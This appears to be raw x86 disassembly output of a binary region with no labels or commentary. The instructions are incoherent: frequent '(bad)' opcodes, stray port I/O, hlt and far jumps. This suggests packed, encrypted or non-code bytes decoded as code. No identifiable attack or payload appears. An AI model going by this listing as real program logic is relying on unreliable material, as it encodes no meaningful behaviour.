  4210fb:	add    ebx,DWORD PTR [esi+0xc9228d4]
  421101:	dec    ebx
  421102:	imul   ecx,DWORD PTR [ebx+0x63f083b8],0xffffffec
  421109:	inc    ebx
  42110a:	sub    esp,ebp
  42110c:	ja     0x4210a2
  42110e:	pop    esi
  42110f:	xchg   DWORD PTR [esi],edx
  421111:	mov    ds:0xeb6dced9,eax
  421116:	inc    ebx
  421117:	rol    BYTE PTR [ebp-0x5cfd4909],cl
  42111d:	jecxz  0x421148
  42111f:	sbb    eax,0x9727b9a1
  421124:	or     eax,0xa7ff2134
  421129:	push   esi
  42112a:	pop    ss
  42112b:	fwait
  42112c:	ret    0x90a7
  42112f:	pushf  
  421130:	arpl   WORD PTR [edx+0x64c91479],ax
  421136:	mov    dh,0x3
  421138:	ja     0x42116d
  42113a:	cli    
  42113b:	arpl   WORD PTR [eax+0x2c],cx
  42113e:	push   fs
  421140:	or     eax,0x2dac7652
  421145:	xor    DWORD PTR [ebp-0x683998db],esp
  42114b:	mov    ds:0xb888d29c,eax
  421150:	sar    BYTE PTR [ebx+eiz*8-0x7cc360ca],0x85
  421158:	in     al,0x88
  42115a:	out    0xa9,eax
  42115c:	dec    esp
  42115d:	das    
  42115e:	xchg   ebx,eax
  42115f:	mov    al,ds:0x3258de0a
  421164:	jae    0x421104
  421166:	push   ebx
  421167:	mov    edx,0x45312578
  42116c:	jle    0x4211bf
  42116e:	add    al,0x69
  421170:	pop    edx
  421171:	add    bh,bh
  421173:	out    0x19,al
  421175:	mov    al,ds:0xf48bd146
  42117a:	sbb    ebp,DWORD PTR [ebx+0x41783536]
  421180:	sbb    ebp,esi
  421182:	addr16 (bad) 
  421184:	mov    ebx,DWORD PTR [ebp-0x1f]
  421187:	sub    eax,0x5bc9603e
  42118c:	inc    edi
  42118d:	cmc    
  42118e:	loop   0x421151
  421190:	and    ch,cl
  421192:	sbb    esi,esp
  421194:	ins    BYTE PTR es:[edi],dx
  421195:	xchg   edi,eax
  421196:	push   ds
  421197:	nop
  421198:	std    
  421199:	(bad)  
  42119a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42119b:	inc    eax
  42119c:	sbb    edi,edi
  42119e:	fdivr  st(2),st
  4211a0:	ins    BYTE PTR es:[edi],dx
  4211a1:	scas   al,BYTE PTR es:[edi]
  4211a2:	push   esi
  4211a3:	cdq    
  4211a4:	mov    dl,0xac
  4211a6:	xor    DWORD PTR [edx-0x2a],eax
  4211a9:	sub    DWORD PTR [eax-0x748683b0],esp
  4211af:	out    dx,al
  4211b0:	dec    esp
  4211b2:	jmp    0x5944:0xc065a602
  4211b9:	push   esi
  4211ba:	pop    ds
  4211bb:	mov    al,ds:0x75567e4c
  4211c0:	inc    eax
  4211c1:	sub    eax,0xe1483891
  4211c6:	ds std 
  4211c8:	push   0x1c8e9216
  4211cd:	xchg   esp,eax
  4211cf:	repz jmp 0x89cf:0x7aa54033
  4211d7:	and    dl,dl
  4211d9:	iret   
  4211da:	test   DWORD PTR [esi-0x57],esi
  4211dd:	aam    0x87
  4211df:	ja     0x4211d1
  4211e1:	hlt    
  4211e2:	retf   
  4211e3:	loopne 0x421262
  4211e5:	cmc    
  4211e6:	pop    ebx
  4211e7:	cmp    eax,0x9d50bc34
  4211ec:	and    esp,ebp
  4211ee:	pop    es
  4211ef:	dec    ebp
  4211f0:	mov    ds:0x76a9ab02,al
  4211f5:	outs   dx,DWORD PTR ds:[esi]
  4211f6:	sub    cl,bh
  4211f8:	bnd jno 0x421188
  4211fb:	mov    DWORD PTR [ecx+0x1d],ebx
  4211fe:	or     DWORD PTR [ebx+0xb],ebp
  421201:	test   eax,0x31f9f15c
  421206:	aam    0x29
  421208:	hlt    
  421209:	lahf   
  42120a:	adc    edx,DWORD PTR [ebx+0x312e3ea]
  421210:	in     al,dx
  421211:	pop    es
  421212:	jmp    0xf86a:0xbe7a7306
  421219:	xchg   DWORD PTR [edx-0x7156bf63],eax
  42121f:	repnz mov dh,dh
  421222:	xor    esp,ebx
  421224:	lahf   
  421225:	sbb    ebp,ebp
  421227:	pop    es
  421228:	imul   esi,DWORD PTR [ecx+0x55],0xecbe8df7
  42122f:	and    eax,0x5c94a747
  421234:	push   ds
  421235:	imul   edx,DWORD PTR [edx+0xae59df0],0x54
  42123c:	arpl   WORD PTR [eax-0x1d],si
  42123f:	pop    ds
  421240:	inc    esp
  421241:	mov    bh,BYTE PTR [edi]
  421243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421244:	mov    ch,ch
  421246:	shl    edi,0xa8
  421249:	adc    bh,0xdb
  42124c:	lahf   
  42124d:	mov    ch,0xd2
  42124f:	push   esp
  421250:	and    dl,al
  421252:	dec    edx
  421253:	push   ss
  421254:	out    dx,eax
  421255:	fwait
  421256:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421257:	push   edx
  421258:	dec    edx
  421259:	std    
  42125a:	pop    ebp
  42125b:	mov    edx,0xf85923e
  421260:	fisttp DWORD PTR [edi]
  421262:	jle    0x42123e
  421264:	xchg   bh,cl
  421266:	test   cl,ch
  421268:	jge    0x42121c
  42126a:	jmp    0x8a99d8e3
  42126f:	ja     0x42129d
  421271:	sub    DWORD PTR [eax+0x6182b1ae],edi
  421277:	xchg   esp,eax
  421278:	cmp    eax,0xb1506a71
  42127d:	mov    al,ds:0x640b9b5d
  421282:	adc    eax,DWORD PTR [ebp+0x20]
  421285:	xchg   ecx,eax
  421286:	mov    dh,dl
  421288:	data16 das 
  42128a:	mov    dl,0xbf
  42128c:	repz xlat BYTE PTR ds:[ebx]
  42128e:	inc    esi
  42128f:	(bad)  
  421290:	xchg   ebp,eax
  421291:	fsubr  QWORD PTR [esi+0x16]
  421294:	add    al,0xbe
  421296:	mov    al,ds:0xc3f2561e
  42129b:	out    dx,eax
  42129c:	jecxz  0x4212e5
  42129e:	xor    al,0x4f
  4212a0:	sbb    ah,bh
  4212a2:	push   0x98dd0679
  4212a7:	and    al,0x3f
  4212a9:	dec    edi
  4212aa:	lods   eax,DWORD PTR ds:[esi]
  4212ab:	int    0x6
  4212ad:	xchg   ebx,eax
  4212ae:	stc    
  4212af:	dec    ebp
  4212b0:	inc    esp
  4212b1:	mov    ch,0xc7
  4212b3:	fild   WORD PTR [esi-0x4c507e46]
  4212b9:	sbb    eax,0x312b7c77
  4212be:	cmp    BYTE PTR [eax],bh
  4212c0:	imul   ebp,DWORD PTR [ecx+0x6d416394],0xffffff87
  4212c7:	mov    ebp,0xec2905d2
  4212cc:	int    0x37
  4212ce:	lods   al,BYTE PTR ds:[esi]
  4212cf:	jmp    0xd37c:0x3d027c3a
  4212d6:	fs mov ecx,0x888fc025
  4212dc:	repnz scas al,BYTE PTR es:[edi]
  4212de:	in     al,dx
  4212df:	es pusha 
  4212e1:	xchg   BYTE PTR [ecx+0x47],dh
  4212e4:	and    edx,edi
  4212e6:	mov    esi,0x2e3a6f0d
  4212eb:	inc    edi
  4212ec:	xchg   esi,eax
  4212ed:	call   0xac02617c
  4212f2:	pop    ebp
  4212f3:	repnz pop es
  4212f5:	call   0xe232:0x1e9c6452
  4212fc:	adc    ebx,DWORD PTR [esi]
  4212fe:	sbb    ah,BYTE PTR [ebp-0x5775e41b]
  421304:	stc    
  421305:	es mov dl,0x98
  421308:	imul   edi,DWORD PTR [ecx+0x562d5e3b],0xffffffd0
  42130f:	or     al,BYTE PTR [ebp+0x52]
  421312:	adc    DWORD PTR [ebx],ebx
  421314:	inc    esp
  421315:	cmp    BYTE PTR [ebp+0x5a],0x70
  421319:	dec    esp
  42131a:	inc    eax
  42131b:	or     dh,BYTE PTR [esi-0x13bf12b6]
  421321:	jae    0x42132e
  421323:	sub    BYTE PTR [ebx-0x610bebda],bl
  421329:	hlt    
  42132a:	addr16 inc edx
  42132c:	push   DWORD PTR [eax+0x50ec32c0]
  421332:	fsubr  QWORD PTR [ebp+ecx*4+0x43]
  421336:	ret    0x50cf
  421339:	fistp  QWORD PTR [edx]
  42133b:	(bad)  
  42133c:	or     al,0xaf
  42133e:	pushf  
  42133f:	dec    edi
  421340:	test   eax,0x302d5985
  421345:	shl    BYTE PTR [ebx-0x5216bcfd],0xdb
  42134c:	nop
  42134d:	in     al,0x15
  42134f:	mov    al,ds:0x2908c74d
  421354:	dec    ebx
  421355:	dec    esp
  421356:	lea    edi,[ebx]
  421358:	retf   
  421359:	add    eax,0x7b7606df
  42135e:	pop    eax
  42135f:	retf   
  421360:	push   esp
  421361:	outs   dx,DWORD PTR ds:[esi]
  421362:	push   ecx
  421363:	jecxz  0x4213d4
  421365:	pop    esi
  421366:	mov    edx,0xa8404b18
  42136b:	(bad)  
  42136c:	int3   
  42136d:	push   0xfffffffb
  42136f:	test   eax,0x400c6762
  421374:	mov    esi,0x882ef2c6
  421379:	and    dl,BYTE PTR [esi]
  42137b:	xor    DWORD PTR [ebx],edx
  42137d:	jns    0x42132f
  42137f:	cdq    
  421380:	xchg   al,bh
  421382:	enter  0x66b8,0xa7
  421386:	sbb    eax,edi
  421388:	das    
  421389:	push   eax
  42138a:	(bad)  
  42138b:	jns    0x4213f6
  42138d:	push   cs
  42138e:	mov    esi,0xd9c4a766
  421393:	iret   
  421394:	aad    0x87
  421396:	sub    eax,0x7ce146c7
  42139b:	les    edx,FWORD PTR [esi+0x2e]
  42139e:	and    al,0x21
  4213a0:	popa   
  4213a1:	xor    dh,BYTE PTR [eax]
  4213a3:	mov    al,ds:0x4b105f50
  4213a8:	adc    BYTE PTR [ebx+ebx*4-0x6a],ah
  4213ac:	jnp    0x4213ce
  4213ae:	inc    ebp
  4213af:	rol    BYTE PTR [ebp+0x62],0xad
  4213b3:	push   ds
  4213b4:	ja     0x42138a
  4213b6:	(bad)  
  4213b7:	in     al,dx
  4213b8:	jbe    0x42133a
  4213ba:	aad    0x75
  4213bc:	fs jno 0x42134b
  4213bf:	repnz enter 0x5e63,0x75
  4213c4:	daa    
  4213c5:	mov    eax,ds:0x7bf7d9dc
  4213ca:	arpl   WORD PTR [ecx-0x3be30778],di
  4213d0:	es push es
  4213d2:	push   edx
  4213d3:	jmp    0x421391
  4213d5:	fisttp WORD PTR [esi]
  4213d7:	stos   DWORD PTR es:[edi],eax
  4213d8:	leave  
  4213d9:	ss loop 0x421420
  4213dc:	xchg   esp,eax
  4213dd:	mov    ch,0x94
  4213df:	push   ecx
  4213e0:	inc    ebx
  4213e1:	outs   dx,DWORD PTR ds:[esi]
  4213e2:	sbb    al,0x10
  4213e4:	(bad)  
  4213e5:	sub    edx,DWORD PTR [ebx]
  4213e7:	out    0x4f,al
  4213e9:	jmp    0xdad3:0x57e58bc9
  4213f0:	lods   al,BYTE PTR ds:[esi]
  4213f1:	fsub   QWORD PTR [esi-0x78]
  4213f4:	add    esp,DWORD PTR [edi+0x43]
  4213f7:	popa   
  4213f8:	cmp    edx,ecx
  4213fa:	js     0x4213b3
  4213fc:	sbb    bh,BYTE PTR ds:0xc6ba40b9
  421402:	repz pusha 
  421404:	pop    esp
  421405:	pop    edi
  421406:	in     eax,dx
  421407:	sbb    ecx,eax
  421409:	div    BYTE PTR [eax+0x2c]
  42140c:	out    0x1e,eax
  42140e:	clflush BYTE PTR [ebx-0x1]
  421412:	hlt    
  421413:	into   
  421414:	dec    eax
  421415:	and    eax,DWORD PTR ds:0xc80b5240
  42141b:	fidiv  DWORD PTR [ecx]
  42141d:	into   
  42141e:	and    DWORD PTR [edx],ebx
  421420:	lods   eax,DWORD PTR ds:[esi]
  421421:	adc    ebp,DWORD PTR [eax-0x17f2f9df]
  421427:	out    dx,eax
  421428:	cdq    
  421429:	loop   0x421494
  42142b:	cli    
  42142c:	xchg   BYTE PTR [ecx],ah
  42142e:	or     DWORD PTR [esi-0x4ff5acd4],0xa400410d
  421438:	jnp    0x421437
  42143a:	idiv   DWORD PTR [eax]
  42143c:	shl    BYTE PTR [edi+0x55],cl
  42143f:	aad    0x4c
  421441:	jne    0x421470
  421443:	cwde   
  421444:	inc    edi
  421445:	les    ebx,FWORD PTR ds:0xe6842801
  42144b:	(bad)  
  42144c:	jo     0x421401
  42144e:	neg    BYTE PTR [eax]
  421450:	sbb    al,0x41
  421452:	(bad)  
  421453:	stos   DWORD PTR es:[edi],eax
  421454:	mov    bh,0xb1
  421456:	ret    0x77b5
  421459:	iret   
  42145a:	push   ebp
  42145b:	icebp  
  42145c:	pop    edi
  42145d:	test   eax,0x22181154
  421462:	dec    edi
  421463:	jg     0x421410
  421465:	push   es
  421466:	pop    eax
  421467:	imul   ebx,DWORD PTR [edx-0x474b5274],0x4e1cda1d
  421471:	js     0x421465
  421473:	inc    ecx
  421474:	fnstcw WORD PTR [esi-0x3061a447]
  42147a:	cmp    esi,edi
  42147c:	in     eax,0x8b
  42147e:	xchg   esi,eax
  42147f:	lock sub al,0x91
  421482:	sbb    DWORD PTR [ebx],ecx
  421484:	sub    eax,0x5f199050
  421489:	std    
  42148a:	lahf   
  42148b:	ds mov eax,0xe554aa08
  421491:	lahf   
  421492:	sbb    al,0x84
  421494:	sar    DWORD PTR [esi-0x280af130],1
  42149a:	mov    ch,0x8e
  42149c:	inc    ecx
  42149d:	(bad)  
  42149e:	mov    dl,0x9a
  4214a0:	je     0x421446
  4214a2:	and    esp,ecx
  4214a4:	pop    eax
  4214a5:	sub    DWORD PTR [edx+ebx*1+0x36d9d48e],esi
  4214ac:	push   edx
  4214ad:	mov    edi,0xc0a5132d
  4214b2:	sub    BYTE PTR [eax-0x7b6f1320],0x43
  4214b9:	dec    ebp
  4214ba:	mov    ds:0x307f24bd,eax
  4214bf:	pop    edx
  4214c0:	xor    eax,0x9d5cd70f
  4214c5:	shr    DWORD PTR [eax+0x6d],cl
  4214c8:	test   DWORD PTR ds:0x2fab0728,ecx
  4214ce:	mov    bh,0xe6
  4214d0:	ds adc al,0xd5
  4214d3:	out    dx,al
  4214d4:	lods   al,BYTE PTR ds:[esi]
  4214d5:	sbb    BYTE PTR [ecx+0x6da9574e],0xd0
  4214dc:	int3   
  4214dd:	mov    BYTE PTR ds:0x1aaa0ce0,bl
  4214e3:	or     eax,0x459871b2
  4214e8:	mov    al,ds:0x33a05e47
  4214ed:	jmp    0x664d:0xc9d66fd8
  4214f4:	sbb    al,0x9c
  4214f6:	inc    ebp
  4214f7:	xor    esi,DWORD PTR [edx+0x47]
  4214fa:	rsqrtps xmm3,XMMWORD PTR [edx]
  4214fd:	rcl    edi,cl
  4214ff:	shr    DWORD PTR [edx*4+0x75d6c67a],0x17
  421507:	dec    ebp
  421508:	dec    esp
  421509:	xor    DWORD PTR [ebx],edi
  42150b:	and    DWORD PTR [edi-0x151a1a13],0xa1d40d1
  421515:	mov    eax,ds:0x31e555dd
  42151a:	sbb    BYTE PTR [ebp+edi*1-0x7aa07502],dh
  421521:	js     0x421525
  421523:	std    
  421524:	xor    ecx,DWORD PTR [eax-0x7720ab53]
  42152a:	es pop ebp
  42152c:	add    bh,ch
  42152e:	push   ebp
  42152f:	int3   
  421530:	fwait
  421531:	add    DWORD PTR [esi],ebx
  421533:	push   0xd445ae95
  421538:	pop    edx
  421539:	or     al,cl
  42153b:	repnz push ebp
  42153d:	push   ds
  42153e:	sub    DWORD PTR [eax],edx
  421540:	popa   
  421541:	adc    esi,DWORD PTR [ecx+edi*1-0x56]
  421545:	pop    ecx
  421546:	jmp    0x5884c0bf
  42154b:	into   
  42154c:	xchg   esi,eax
  42154d:	pop    edx
  42154e:	push   edi
  42154f:	inc    edi
  421550:	sbb    al,BYTE PTR [edi+0x4fc1c436]
  421556:	adc    al,0x16
  421558:	mov    bl,0x35
  42155a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42155b:	ds inc edx
  42155d:	outs   dx,DWORD PTR ds:[esi]
  42155e:	dec    ebx
  42155f:	scas   al,BYTE PTR es:[edi]
  421560:	frndint 
  421562:	andnps xmm0,XMMWORD PTR [esi+0x5904d33]
  421569:	mov    al,0xf9
  42156b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42156c:	push   DWORD PTR [edi+0x6edc9330]
  421572:	aaa    
  421573:	stos   DWORD PTR es:[edi],eax
  421574:	inc    esp
  421575:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421576:	test   al,0xec
  421578:	push   ebp
  421579:	ja     0x4215d2
  42157b:	adc    esi,edi
  42157d:	ins    DWORD PTR es:[edi],dx
  42157e:	retf   
  42157f:	popf   
  421580:	mov    ebp,0x2f9d045d
  421585:	dec    eax
  421586:	xchg   esp,eax
  421587:	adc    ebx,DWORD PTR [ecx]
  421589:	cmp    DWORD PTR [ecx],ebp
  42158b:	add    al,0xf5
  42158d:	cmp    ecx,0xffffff88
  421590:	lods   al,BYTE PTR ds:[esi]
  421591:	xchg   esp,eax
  421592:	scas   eax,DWORD PTR es:[edi]
  421593:	daa    
  421594:	mov    ds:0xa854a2b7,eax
  421599:	xor    ebp,DWORD PTR [ebx-0x321a17bd]
  42159f:	sbb    DWORD PTR [edx*8-0x546edc60],edi
  4215a6:	fwait
  4215a7:	jbe    0x421613
  4215a9:	sub    BYTE PTR [edx-0x5],al
  4215ac:	jmp    0x9433:0x9ab086b
  4215b3:	and    eax,0x733fe64a
  4215b8:	pop    ss
  4215b9:	jmp    0xf448:0x7849b7e1
  4215c0:	fisubr WORD PTR [edx]
  4215c2:	sub    DWORD PTR [edi+0x18d2fff3],0x2e
  4215c9:	xchg   esi,eax
  4215ca:	mov    cl,BYTE PTR ds:0x40945f96
  4215d0:	lods   eax,DWORD PTR ds:[esi]
  4215d1:	ins    DWORD PTR es:[edi],dx
  4215d2:	xchg   edx,eax
  4215d3:	(bad)  
  4215d4:	hlt    
  4215d5:	std    
  4215d6:	nop
  4215d7:	ss das 
  4215d9:	outs   dx,DWORD PTR ds:[esi]
  4215da:	push   eax
  4215db:	dec    esi
  4215dc:	dec    eax
  4215dd:	mov    esp,0x6b443299
  4215e2:	mov    eax,0x21a1887b
  4215e7:	ret    
  4215e8:	into   
  4215e9:	add    esp,DWORD PTR [ebx+0x1e]
  4215ec:	hlt    
  4215ed:	shl    DWORD PTR [ebp+0x4e],0xe5
  4215f1:	jge    0xabc4a1a9
  4215f7:	sub    edi,DWORD PTR [eax]
  4215f9:	cmp    eax,0xf2a6be99
  4215fe:	add    bh,BYTE PTR [edx+0x48]
  421601:	ds jnp 0x4215a4
  421604:	mov    ecx,0x8977defe
  421609:	mov    ds:0x7efa388d,eax
  42160e:	daa    
  42160f:	adc    ebp,DWORD PTR [ecx]
  421611:	and    al,0x95
  421613:	jmp    0x34470931
  421618:	js     0x42165f
  42161a:	pop    esp
  42161b:	int    0xae
  42161d:	enter  0xb3a0,0x10
  421621:	shl    DWORD PTR [esi+0x333a7966],1
  421627:	push   0xd197ddd6
  42162c:	popa   
  42162d:	mov    dl,0x9
  42162f:	adc    eax,edi
  421631:	das    
  421632:	push   esi
  421633:	mov    eax,0xb0ad66cd
  421638:	xchg   esi,eax
  421639:	hlt    
  42163a:	pop    ds
  42163b:	inc    ebx
  42163c:	push   0x1b
  42163e:	out    dx,eax
  42163f:	fild   QWORD PTR [eax-0x5d]
  421642:	sub    esi,DWORD PTR [edx+0x27]
  421645:	sbb    edx,DWORD PTR [eax-0x55]
  421648:	test   DWORD PTR [eax+0x18],0x9d9f1c7
  42164f:	xchg   ebx,eax
  421650:	int    0xad
  421652:	mov    ebp,0xc9c980a3
  421657:	lods   al,BYTE PTR ds:[esi]
  421658:	cwde   
  421659:	or     eax,0xb61c6f2f
  42165e:	mov    esi,0x694fcf6f
  421664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421665:	jmp    0x421661
  421667:	repnz and ebp,DWORD PTR [ecx-0x3d230766]
  42166e:	retf   
  42166f:	add    eax,0x301e135c
  421674:	pop    ebp
  421675:	mov    esi,0xb2a34c6
  42167a:	cdq    
  42167b:	mov    ah,0x3f
  42167d:	aad    0x3a
  42167f:	cmp    esi,DWORD PTR [ebp+0x44]
  421682:	xor    DWORD PTR [esi+eiz*2+0x46],esi
  421686:	jl     0x421645
  421688:	jecxz  0x421654
  42168a:	stos   BYTE PTR es:[edi],al
  42168b:	punpckhwd mm6,QWORD PTR [edi-0x4827878]
  421692:	mov    esi,0x1b0d1e85
  421697:	or     edx,esi
  421699:	mov    edx,0x6f5f77a5
  42169e:	mov    dh,0x26
  4216a0:	sub    dl,BYTE PTR [esi]
  4216a2:	rcl    DWORD PTR [ebx-0x75b18fc3],cl
  4216a8:	sub    eax,0x5d2edf4a
  4216ad:	fldenv [ecx-0x52]
  4216b0:	cdq    
  4216b1:	jmp    0x9cfe6cd1
  4216b6:	mov    cl,0x0
  4216b8:	xchg   DWORD PTR [edx-0x279b0a55],edx
  4216be:	sub    edx,esi
  4216c0:	mov    eax,ds:0xd398036a
  4216c5:	sub    esi,ecx
  4216c7:	test   al,0xe6
  4216c9:	push   ds
  4216ca:	not    BYTE PTR [ecx-0x41]
  4216cd:	das    
  4216ce:	repz ss call 0xacdf:0x59b16f45
  4216d7:	rcr    bh,1
  4216d9:	and    DWORD PTR [edx+0x42],eax
  4216dc:	lock dec ecx
  4216de:	ins    DWORD PTR es:[edi],dx
  4216df:	sbb    esi,eax
  4216e1:	mov    ch,BYTE PTR [esi-0x5b6324b9]
  4216e7:	add    al,0x1a
  4216e9:	aad    0xdf
  4216eb:	sub    BYTE PTR [ecx+0x626e1e34],dh
  4216f1:	(bad)  
  4216f2:	push   edi
  4216f3:	sub    cl,BYTE PTR ds:0xdb67493
  4216f9:	mov    ebp,0x104a9ac4
  4216fe:	jmp    0x42169d
  421700:	mov    DWORD PTR [ecx+0x74ea31e2],ebp
  421706:	xor    BYTE PTR [eax-0x12],0x3
  42170a:	xor    cl,ah
  42170c:	xor    al,0xb
  42170e:	addr16 mov ax,ax
  421712:	xor    eax,0x3cb63a86
  421717:	(bad)  [eax+edx*2+0x8]
  42171b:	dec    eax
  42171c:	jnp    0x42170b
  42171e:	fcomp  DWORD PTR [ecx-0x27]
  421721:	sbb    edx,DWORD PTR [ecx+eiz*8]
  421724:	pop    esp
  421725:	sar    ecx,1
  421727:	push   edi
  421728:	push   esi
  421729:	xchg   esi,eax
  42172a:	mov    BYTE PTR [edi-0x52b0e2be],dh
  421730:	sub    ecx,DWORD PTR [eax]
  421732:	call   FWORD PTR [edx-0x42]
  421735:	push   eax
  421736:	xor    esp,DWORD PTR [ecx]
  421738:	pop    ebp
  421739:	clc    
  42173a:	push   esp
  42173b:	fdiv   DWORD PTR [ecx]
  42173d:	jp     0x421779
  42173f:	xor    al,0x77
  421741:	cdq    
  421742:	or     al,0x6a
  421744:	mov    ds:0xfea90e26,al
  421749:	jb     0x4216ef
  42174b:	das    
  42174c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42174d:	icebp  
  42174e:	ins    BYTE PTR es:[edi],dx
  42174f:	mov    ds:0xdff6f8d5,eax
  421754:	pop    esi
  421755:	mul    DWORD PTR [esi+0xd]
  421758:	lods   al,BYTE PTR ds:[esi]
  421759:	les    edx,FWORD PTR [esi+0x66159f4f]
  42175f:	sub    DWORD PTR [esi+0x45],0x839a0f4b
  421766:	loope  0x4217de
  421768:	adc    edx,DWORD PTR [eax-0x2c]
  42176b:	jp     0x42178d
  42176d:	sub    BYTE PTR [ebp+0x66],al
  421770:	pop    ebp
  421771:	sbb    ebx,edi
  421773:	test   al,0x88
  421775:	ds xor eax,0x2260973f
  42177b:	sbb    BYTE PTR [ebp+0x6103ef05],bl
  421781:	and    ebx,esi
  421783:	adc    bh,BYTE PTR [ebx+0x66]
  421786:	(bad)  
  421787:	sahf   
  421788:	jp     0x42177b
  42178a:	cmp    ch,0x19
  42178d:	shr    DWORD PTR [edi+0x42],cl
  421790:	aas    
  421791:	stc    
  421792:	xor    bh,BYTE PTR [edi+0x3e4133e9]
  421798:	sbb    DWORD PTR [eax+0x4fb2a94c],0xe8ea56ce
  4217a2:	xchg   edx,eax
  4217a3:	push   ebp
  4217a4:	xchg   ecx,eax
  4217a5:	inc    ecx
  4217a6:	or     al,0xb1
  4217a8:	pop    ebp
  4217a9:	push   0xffffffe9
  4217ab:	xchg   esp,eax
  4217ac:	cmc    
  4217ad:	test   al,0x7f
  4217af:	int3   
  4217b0:	adc    dl,BYTE PTR [edi-0x76]
  4217b3:	mov    ch,0x8e
  4217b5:	outs   dx,DWORD PTR ds:[esi]
  4217b6:	add    edi,0x3d
  4217b9:	nop
  4217ba:	stos   BYTE PTR es:[edi],al
  4217bb:	call   0xb87f:0x6c2e88b8
  4217c2:	mov    eax,0xe994df55
  4217c7:	pop    ebx
  4217c8:	repnz out dx,al
  4217ca:	and    DWORD PTR [esi+0x59],ebx
  4217cd:	mov    al,0xcb
  4217cf:	mov    ebp,0x7a870189
  4217d4:	retf   0x5c13
  4217d7:	mov    BYTE PTR gs:[esi-0x42],ah
  4217db:	in     al,0xbb
  4217dd:	jg     0x42176b
  4217df:	sub    cl,ch
  4217e1:	jl     0x421821
  4217e3:	or     BYTE PTR [ecx-0x316da8a6],ah
  4217e9:	dec    ebp
  4217ea:	pop    eax
  4217eb:	add    BYTE PTR [edx],ch
  4217ed:	and    eax,0xcefdd71b
  4217f2:	test   BYTE PTR [edx-0x6e1adb3f],0xbc
  4217f9:	je     0x4217ba
  4217fb:	adc    cl,BYTE PTR [ecx+0x41b6b198]
  421801:	daa    
  421802:	jecxz  0x4217fd
  421804:	stc    
  421805:	outs   dx,BYTE PTR ds:[esi]
  421806:	inc    eax
  421807:	adc    al,cl
  421809:	sub    eax,0x4d82052d
  42180e:	xor    edi,DWORD PTR [edi-0x38]
  421811:	dec    edx
  421812:	dec    eax
  421813:	push   ebx
  421814:	outs   dx,DWORD PTR ds:[esi]
  421815:	lds    ebx,FWORD PTR [ebx]
  421817:	rcl    DWORD PTR [eax+0x7f],0x31
  42181b:	xchg   ecx,eax
  42181c:	pop    eax
  42181d:	push   eax
  42181e:	adc    BYTE PTR [ecx+eiz*2],dh
  421821:	sar    DWORD PTR [ecx],0xf7
  421824:	lahf   
  421825:	imul   edi,DWORD PTR [ebx-0x79],0x242793a8
  42182c:	pushf  
  42182d:	jbe    0x421828
  42182f:	in     al,0x4a
  421831:	sub    eax,0x38fcedd2
  421836:	pcmpgtd mm2,QWORD PTR [esp+esi*1]
  42183a:	add    eax,DWORD PTR [eax]
  42183c:	and    DWORD PTR [ebx],edi
  42183e:	daa    
  42183f:	and    esp,DWORD PTR [ebx-0x3f]
  421842:	(bad)  
  421843:	sub    eax,0x9cb42c7
  421848:	retf   0xebdf
  42184b:	clc    
  42184c:	mov    esp,DWORD PTR [edx]
  42184e:	adc    bh,BYTE PTR [ebx-0x8]
  421851:	pop    ss
  421852:	sub    edx,DWORD PTR ds:0xffb622e8
  421858:	mov    DWORD PTR [edx+0x30],edx
  42185b:	mov    DWORD PTR [eax-0x23],esp
  42185e:	sub    al,0xdd
  421860:	rcl    esi,cl
  421862:	mov    edx,0x3f8da1dd
  421867:	mov    ds:0xe2775c79,al
  42186c:	mov    bl,0xcb
  42186e:	(bad)  
  42186f:	cld    
  421870:	sbb    dl,BYTE PTR [esi+ebx*1-0xa]
  421874:	clc    
  421875:	sbb    eax,0x970bd630
  42187b:	jno    0x4218f0
  42187d:	sbb    bh,dl
  42187f:	add    BYTE PTR [edx+0x17529d1b],cl
  421885:	jae    0x4218f2
  421887:	in     al,dx
  421888:	push   0xffffff85
  42188a:	test   BYTE PTR [edx+0x59],ah
  42188d:	adc    BYTE PTR [edx-0x791957d2],ch
  421893:	pop    ds
  421894:	ret    
  421895:	std    
  421896:	cdq    
  421897:	adc    BYTE PTR [eax-0x5f],al
  42189a:	fcom   QWORD PTR [ebx-0x43cc633]
  4218a0:	mov    al,0xe5
  4218a2:	mov    dl,0x5d
  4218a4:	test   DWORD PTR [eax],0x776dbb40
  4218aa:	call   0xb6dfe99a
  4218af:	pop    ds
  4218b0:	cdq    
  4218b1:	push   ecx
  4218b2:	ins    DWORD PTR es:[edi],dx
  4218b3:	add    esp,ebp
  4218b5:	mov    ah,0x66
  4218b7:	pop    edx
  4218b8:	bnd ja 0x4218c9
  4218bb:	fisub  WORD PTR [ebp+eax*4-0x6a]
  4218bf:	repz fsubr DWORD PTR [ebp+0x26]
  4218c3:	sbb    esi,DWORD PTR [eax-0x1e]
  4218c6:	inc    ebp
  4218c7:	mov    bh,0xf0
  4218c9:	pushf  
  4218ca:	std    
  4218cb:	fild   WORD PTR [edx+0x6e59bd56]
  4218d1:	jg     0x4218a7
  4218d3:	(bad)  
  4218d4:	dec    eax
  4218d5:	jo     0x421922
  4218d7:	call   0x837b:0xfa05a13e
  4218de:	popa   
  4218df:	lds    edi,FWORD PTR [ebx+eiz*4+0x69]
  4218e3:	push   ebp
  4218e4:	fwait
  4218e5:	add    BYTE PTR [ebp-0x18201272],cl
  4218eb:	data16 add al,0x1
  4218ee:	call   0x9275:0x27c80820
  4218f5:	aam    0x98
  4218f7:	pop    ecx
  4218f8:	inc    ecx
  4218f9:	jbe    0x42188b
  4218fb:	aam    0x65
  4218fd:	add    cl,BYTE PTR [edi]
  4218ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421900:	fidiv  DWORD PTR [ecx-0x3f]
  421903:	xor    ebp,edi
  421905:	pop    ecx
  421906:	and    al,0xfe
  421908:	test   al,0x2c
  42190a:	lds    ebx,FWORD PTR [ebp-0x4e7cc932]
  421910:	in     al,0x4b
  421912:	sub    BYTE PTR [ebx+0x1afe8be6],ah
  421918:	add    ebp,ebx
  42191a:	adc    edi,ebp
  42191c:	jmp    0xc225:0x509a74a1
  421923:	leave  
  421924:	push   ds
  421925:	cli    
  421926:	push   edx
